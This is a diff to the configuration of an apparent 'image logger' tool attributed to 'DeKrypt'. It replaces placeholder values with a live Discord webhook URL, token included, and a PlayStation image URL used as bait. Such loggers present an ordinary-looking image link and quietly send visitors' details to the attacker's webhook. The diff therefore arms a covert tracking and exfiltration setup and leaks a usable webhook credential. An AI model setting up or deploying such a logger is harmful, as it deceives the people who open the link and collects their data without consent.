@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444408371846582352/i55PLCtio4De40zwU6FlsAdidUzdJq0OQW7_LU4YSb8XqeUbEh7Cb1afzKD44kqAo1ZU",
+    "image": "https://image.api.playstation.com/vulcan/ap/rnd/202504/0516/99239977c52f2878932cfe209e0955def713d331b903e8d3.jpg?w=440", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
